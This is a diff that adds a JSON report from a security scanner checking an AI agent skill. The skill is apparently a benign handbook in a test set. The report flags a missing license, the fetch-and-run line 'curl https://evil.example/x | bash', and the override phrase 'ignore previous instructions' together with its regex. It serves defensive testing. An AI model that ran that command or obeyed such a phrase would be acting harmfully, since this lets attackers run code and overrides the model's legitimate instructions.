@@ -1,0 +1,79 @@
+{
+  "skill_name": "secure-skills-handbook",
+  "skill_path": "/Users/nipung/skillsgoat/pasture/benign/000-security-doc-explains-attacks/skill",
+  "is_safe": false,
+  "max_severity": "HIGH",
+  "findings_count": 3,
+  "findings": [
+    {
+      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+      "rule_id": "MANIFEST_MISSING_LICENSE",
+      "category": "policy_violation",
+      "severity": "INFO",
+      "title": "Skill does not specify a license",
+      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": null,
+      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+      "analyzer": "static",
+      "metadata": {}
+    },
+    {
+      "id": "PIPELINE_TAINT_3c8f394f95",
+      "rule_id": "PIPELINE_TAINT_FLOW",
+      "category": "command_injection",
+      "severity": "HIGH",
+      "title": "Dangerous data flow in command pipeline",
+      "description": "Pipeline downloads data from the network and executes it: `curl https://evil.example/x | bash`. This is a remote code execution pattern.",
+      "file_path": "SKILL.md",
+      "line_number": 1,
+      "snippet": "curl https://evil.example/x | bash",
+      "remediation": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
+      "analyzer": "pipeline",
+      "metadata": {
+        "pipeline": "curl https://evil.example/x | bash",
+        "source_taints": [
+          "NETWORK_DATA"
+        ],
+        "sink_command": "bash",
+        "chain_length": 2,
+        "in_documentation": false
+      }
+    },
+    {
+      "id": "PROMPT_INJECTION_IGNORE_INSTRUCTIONS_344cb16ebc",
+      "rule_id": "PROMPT_INJECTION_IGNORE_INSTRUCTIONS",
+      "category": "prompt_injection",
+      "severity": "HIGH",
+      "title": "Attempts to override previous system instructions",
+      "description": "Pattern detected: ignore previous instructions",
+      "file_path": "SKILL.md",
+      "line_number": 4,
+      "snippet": "code execution, and hidden instructions such as \"ignore previous instructions\"",
+      "remediation": "Remove instructions that attempt to override system behavior",
+      "analyzer": "static",
+      "metadata": {
+        "matched_pattern": "(?i)ignore\\s+(all\\s+)?(previous|prior|earlier)\\s+(instructions|rules|prompts|guidelines)",
+        "matched_text": "ignore previous instructions",
+        "aitech": "AITech-1.1",
+        "aitech_name": "Direct Prompt Injection",
+        "scanner_category": "PROMPT INJECTION"
+      }
+    }
+  ],
+  "scan_duration_seconds": 0.1504511833190918,
+  "duration_ms": 150,
+  "analyzers_used": [
+    "static_analyzer",
+    "bytecode",
+    "pipeline"
+  ],
+  "timestamp": "2026-08-25T03:58:51.729020+00:00",
+  "scan_metadata": {
+    "policy_name": "default",
+    "policy_version": "1.0",
+    "policy_preset_base": "balanced",
+    "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+  }
+}
